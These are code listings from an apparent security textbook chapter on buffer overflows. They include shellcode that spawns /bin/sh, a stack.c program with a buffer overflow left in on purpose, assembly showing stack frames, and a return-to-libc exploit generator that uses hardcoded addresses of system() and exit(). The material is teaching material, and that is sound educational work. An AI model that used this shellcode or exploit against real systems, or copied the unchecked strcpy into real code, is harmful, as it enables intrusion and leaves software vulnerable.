/******************************
 * Code in Chapter 5
 ******************************/


/**********************************************
 * Code on Page 90 (Section 5.1)
 **********************************************/ 
/* shellcode.c */
#include <string.h>

const char code[] =
  "\x31\xc0\x50\x68//sh\x68/bin"
  "\x89\xe3\x50\x53\x89\xe1\x99"
  "\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
   char buffer[sizeof(code)];
   strcpy(buffer, code);
   ((void(*)( ))buffer)( );
}



/**********************************************
 * Listing 5.1: The stack.c program (Section 5.2)
 **********************************************/ 
/* stack.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int vul_func(char *str)
{
    char buffer[50];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);       (*@\ding{192}@*)

    return 1;
}

int main(int argc, char **argv)
{
    char str[240];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 200, badfile);
    vul_func(str);

    printf("Returned Properly\n");
    return 1;
}




/**********************************************
 * Code on Page 97 (prog.c, Section 5.4.3)
 * ********************************************/ 
void foo(int x) {
   int a; 
   a = x;
}

void bar() {
   int b = 5;
   foo (b);
}



/**********************************************
 * Code on Page 98 (Section 5.4.3)
 **********************************************/ 
$ gcc -S prog.c
$ cat prog.s
// some instructions omitted
foo:
      pushl \%ebp                 
      movl \%esp, \%ebp
      subl \$16, \%esp            
      movl    8(%ebp), %eax         
      movl    %eax, -4(%ebp)
      leave                      
      ret                        
bar:
      pushl   %ebp
      movl    %esp, %ebp
      subl    $20, %esp
      movl    $5, -4(%ebp)
      movl    -4(%ebp), %eax
      movl    %eax, (%esp)
      call foo
      leave
      ret



/**********************************************
 * Code on Page 100 (Section 5.4.5)
 **********************************************/ 
// ret_to_libc_exploit.c
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
  char buf[200];
  FILE *badfile;

  memset(buf, 0xaa, 200); // fill the buffer with non-zeros

  *(long *) &buf[70] = 0xbffffe8c ;   //  The address of "/bin/sh"
  *(long *) &buf[66] = 0xb7e52fb0 ;   //  The address of exit()
  *(long *) &buf[62] = 0xb7e5f430 ;   //  The address of system()

  badfile = fopen("./badfile", "w");
  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}


